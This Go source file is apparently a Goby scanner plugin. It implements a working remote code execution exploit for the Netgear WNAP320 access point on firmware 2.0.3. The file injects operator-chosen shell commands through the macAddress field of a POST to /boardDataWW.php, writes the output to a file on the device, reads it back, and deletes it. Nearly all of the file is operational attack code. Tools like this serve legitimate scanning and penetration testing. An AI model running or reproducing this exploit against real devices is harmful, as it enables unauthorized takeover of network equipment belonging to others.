package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Netgear WNAP320 Access Point Firmware Version 2.0.3 RCE",
    "Description": "Netgear NETGEAR is a router from Netgear. A hardware device that connects two or more networks and acts as a gateway between networks. NETGEAR Nighthawk WNAP320 has a security vulnerability that can be exploited by attackers to execute arbitrary code on the affected device installation.",
    "Product": "Netgear-WNAP320",
    "Homepage": "https://www.netgear.com.cn/",
    "DisclosureDate": "2021-07-06",
    "Author": "go0p",
    "FofaQuery": "title=\"Netgear\"",
    "GobyQuery": "title=\"Netgear\"",
    "Level": "3",
    "Impact": "",
    "Recommendation": "",
    "References": null,
    "RealReferences": [
        "https://www.exploit-db.com/exploits/50069",
        "https://github.com/nobodyatall648/Netgear-WNAP320-Firmware-Version-2.0.3-RCE"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "Name": "Cmd",
            "Type": "input",
            "Value": "id"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "rce"
    ],
    "CVEIDs": null,
    "CVSSScore": "N/A",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": [
            "Netgear-WNAP320"
        ]
    },
    "Disable": false,
    "PocId": "10475"
}`
	doPost := func(u *httpclient.FixUrl, cmd string) (string, error) {
		cfg := httpclient.NewPostRequestConfig("/boardDataWW.php")
		cfg.FollowRedirect = false
		cfg.VerifyTls = false
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.Data = "macAddress=112233445566%3B" + cmd + "+%23&reginfo=0&writeData=Submit"
		resp, err := httpclient.DoHttpRequest(u, cfg)
		return resp.RawBody, err
	}
	rm := "rm+.%2Foutput"
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			randStr := goutils.RandomHexString(16)
			echo := "echo+" + randStr + "+%3E+.%2Foutput"
			if _, err := doPost(hostinfo, echo); err != nil {
				return false
			}
			if resp, err := httpclient.SimpleGet(hostinfo.FixedHostInfo + "/output"); err == nil && strings.Contains(resp.RawBody, randStr) {
				_, _ = doPost(hostinfo, rm)
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := stepLogs.Params["Cmd"].(string)
			echo := cmd + "+%3E+.%2Foutput"
			if _, err := doPost(expResult.HostInfo, echo); err != nil {
				return expResult
			}
			if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + "/output"); err == nil && strings.Contains(resp.RawBody, "uid") {
				_, _ = doPost(expResult.HostInfo, rm)
				expResult.Success = true
				expResult.Output = resp.RawBody
			}
			return expResult
		},
	))
}
